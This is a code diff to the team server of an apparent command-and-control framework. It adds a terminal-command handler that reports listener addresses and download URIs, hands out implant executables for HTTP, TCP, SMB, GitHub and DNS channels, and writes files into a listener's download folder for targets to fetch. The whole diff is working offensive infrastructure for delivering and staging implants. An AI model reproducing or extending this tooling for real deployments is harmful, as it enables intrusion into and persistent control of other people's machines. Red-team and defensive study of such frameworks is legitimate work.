@@ -887,22 +887,6 @@ grpc::Status TeamServer::GetHelp(grpc::ServerContext* context, const teamservera
 }
 
 
-grpc::Status TeamServer::SendTermCmd(grpc::ServerContext* context, const teamserverapi::TermCommand* command,  teamserverapi::TermCommand* response)
-{
-	m_logger->trace("SendTermCmd");
-
-	std::string cmd = command->cmd();
-	std::cout << "cmd " << cmd << std::endl;
-
-	teamserverapi::TermCommand responseTmp;
-	responseTmp.set_result("OK");
-
-	*response = responseTmp;
-
-	return grpc::Status::OK;
-}
-
-
 // Split input based on spaces and single quotes
 // Use single quote to passe aguments as a single parameters even if it's contain spaces
 // Singles quotes are removed
@@ -932,6 +916,276 @@ void static inline splitInputCmd(const std::string& input, std::vector<std::stri
 
 	if(!tmp.empty())
 		splitedList.push_back(tmp);
+}
+
+
+std::string getIPAddress(std::string &interface)
+{
+    string ipAddress="";
+    struct ifaddrs *interfaces = NULL;
+    struct ifaddrs *temp_addr = NULL;
+    int success = 0;
+    success = getifaddrs(&interfaces);
+    if (success == 0) 
+	{
+        temp_addr = interfaces;
+        while(temp_addr != NULL) 
+		{
+            if(temp_addr->ifa_addr->sa_family == AF_INET) 
+			{ 
+                if(strcmp(temp_addr->ifa_name, interface.c_str())==0)
+				{
+                    ipAddress=inet_ntoa(((struct sockaddr_in*)temp_addr->ifa_addr)->sin_addr);
+                }
+            }
+            temp_addr = temp_addr->ifa_next;
+        }
+    }
+    freeifaddrs(interfaces);
+    return ipAddress;
+}
+
+
+grpc::Status TeamServer::SendTermCmd(grpc::ServerContext* context, const teamserverapi::TermCommand* command,  teamserverapi::TermCommand* response)
+{
+	m_logger->trace("SendTermCmd");
+
+	std::string cmd = command->cmd();
+	m_logger->debug("SendTermCmd {0}",cmd);
+
+	std::vector<std::string> splitedCmd;
+	splitInputCmd(cmd, splitedCmd);
+
+	teamserverapi::TermCommand responseTmp;
+	std::string none="";
+	responseTmp.set_cmd(none);
+	responseTmp.set_result(none);
+	responseTmp.set_data(none);
+
+	string instruction = splitedCmd[0];
+	if(instruction=="infoListener")
+	{
+		m_logger->info("infoListener {0}", cmd);
+
+		if(splitedCmd.size()==2)
+		{
+			std::string listenerHash = splitedCmd[1];
+
+			for (int i = 0; i < m_listeners.size(); i++)
+			{
+				std::string hash = m_listeners[i]->getListenerHash();
+				if (hash.find(listenerHash) != std::string::npos) 
+				{
+					std::string type = m_listeners[i]->getType();
+
+					std::string interface="";
+					auto it = m_config.find("IpInterface");
+					if(it != m_config.end())
+						interface = m_config["IpInterface"].get<std::string>();
+
+					std::string domainName="";
+					it = m_config.find("DomainName");
+					if(it != m_config.end())
+						domainName = m_config["DomainName"].get<std::string>();
+
+					std::string ip = "";
+					if(!interface.empty())
+						ip = getIPAddress(interface);
+
+					if(ip.empty() && domainName.empty())
+					{
+						responseTmp.set_result("Error: No IP or Hostname in config.");
+						*response = responseTmp;
+						return grpc::Status::OK;
+					}
+
+					std::string port = m_listeners[i]->getParam2();
+					std::string uriFileDownload = "";
+
+					if (type == ListenerHttpType)
+					{
+						json configHttp = m_config["ListenerHttpConfig"];
+
+						auto it = configHttp[0].find("uriFileDownload");
+						if(it != configHttp[0].end())
+							uriFileDownload = configHttp[0]["uriFileDownload"].get<std::string>();
+										
+					}
+					else if (type == ListenerHttpsType)
+					{
+						json configHttps = m_config["ListenerHttpsConfig"];
+
+						auto it = configHttps[0].find("uriFileDownload");
+						if(it != configHttps[0].end())
+							uriFileDownload = configHttps[0]["uriFileDownload"].get<std::string>();;
+					}
+
+					std::string result=type;
+					result+="\n";
+					if(!domainName.empty())
+						result+=domainName;
+					else if(!ip.empty())
+						result+=ip;
+					result+="\n";
+					result+=port;
+					result+="\n";
+					result+=uriFileDownload;
+
+					responseTmp.set_result(result);
+				}
+			}
+		}
+		else
+		{
+			responseTmp.set_result("Error: infoListener take one arguement.");
+			*response = responseTmp;
+			return grpc::Status::OK;
+		}
+	}
+	else if(instruction=="getBeaconBinary")
+	{
+		m_logger->info("getBeaconBinary {0}", cmd);
+
+		if(splitedCmd.size()==2)
+		{
+			std::string listenerHash = splitedCmd[1];
+			for (int i = 0; i < m_listeners.size(); i++)
+			{
+				std::string hash = m_listeners[i]->getListenerHash();
+				if (hash.find(listenerHash) != std::string::npos) 
+				{
+					std::string type = m_listeners[i]->getType();
+
+					if(type == ListenerHttpType || type == ListenerHttpsType )
+					{
+						std::ifstream input( "../Beacons/BeaconHttp.exe", std::ios::binary );
+						std::string binaryData((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
+
+						responseTmp.set_data(binaryData);
+					}
+					else if(type == ListenerTcpType )
+					{
+						std::ifstream input( "../Beacons/BeaconTcp.exe", std::ios::binary );
+						std::string binaryData((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
+
+						responseTmp.set_data(binaryData);
+					}
+					else if(type == ListenerSmbType )
+					{
+						std::ifstream input( "../Beacons/BeaconSmb.exe", std::ios::binary );
+						std::string binaryData((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
+
+						responseTmp.set_data(binaryData);
+					}
+					else if(type == ListenerGithubType )
+					{
+						std::ifstream input( "../Beacons/BeaconGithub.exe", std::ios::binary );
+						std::string binaryData((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
+
+						responseTmp.set_data(binaryData);
+					}
+					else if(type == ListenerDnsType )
+					{
+						std::ifstream input( "../Beacons/BeaconDns.exe", std::ios::binary );
+						std::string binaryData((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
+
+						responseTmp.set_data(binaryData);
+					}
+				}
+			}
+		}
+		else
+		{
+			responseTmp.set_result("Error: getBeaconBinary take one arguement.");
+			*response = responseTmp;
+			return grpc::Status::OK;
+		}
+	}
+	else if(instruction=="putIntoUploadDir")
+	{
+		m_logger->info("putIntoUploadDir {0}", cmd);
+
+		if(splitedCmd.size()==3)
+		{
+			std::string listenerHash = splitedCmd[1];
+
+			std::string filename = splitedCmd[2];
+			if (filename.find_first_not_of("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890-_.") != std::string::npos)
+			{
+				responseTmp.set_result("Error: filename not allowed.");
+				*response = responseTmp;
+				return grpc::Status::OK;
+			}
+			std::string data = command->data();
+
+			std::string downloadFolder="";
+			for (int i = 0; i < m_listeners.size(); i++)
+			{
+				std::string hash = m_listeners[i]->getListenerHash();
+				if (hash.find(listenerHash) != std::string::npos) 
+				{
+					std::string type = m_listeners[i]->getType();
+
+					if (type == ListenerHttpType)
+					{
+						json configHttp = m_config["ListenerHttpConfig"];
+
+						auto it = configHttp[0].find("downloadFolder");
+						if(it != configHttp[0].end())
+							downloadFolder = configHttp[0]["downloadFolder"].get<std::string>();;
+										
+					}
+					else if (type == ListenerHttpsType)
+					{
+						json configHttps = m_config["ListenerHttpsConfig"];
+
+						auto it = configHttps[0].find("downloadFolder");
+						if(it != configHttps[0].end())
+							downloadFolder = configHttps[0]["downloadFolder"].get<std::string>();;
+					}
+				}
+			}
+
+			if(!downloadFolder.empty())
+			{
+				std::string filePath = downloadFolder;
+				filePath+="/";
+				filePath+=filename;
+
+				ofstream wf(filePath, ios::out | ios::binary);
+				if (wf) 
+				{
+					wf << data;
+					wf.close();
+					responseTmp.set_result("ok");
+				}
+				else
+				{
+					responseTmp.set_result("Error: Cannot write file.");
+				}
+			}
+			else
+			{
+				responseTmp.set_result("Error: Listener don't have a download folder.");
+			}
+		}
+		else
+		{
+			responseTmp.set_result("Error: putIntoUploadDir take tow arguements.");
+			*response = responseTmp;
+			return grpc::Status::OK;
+		}
+	}
+	else
+	{
+		responseTmp.set_result("Error: not implemented.");
+		*response = responseTmp;
+		return grpc::Status::OK;
+	}
+
+	*response = responseTmp;
+
+	return grpc::Status::OK;
 }
 
 
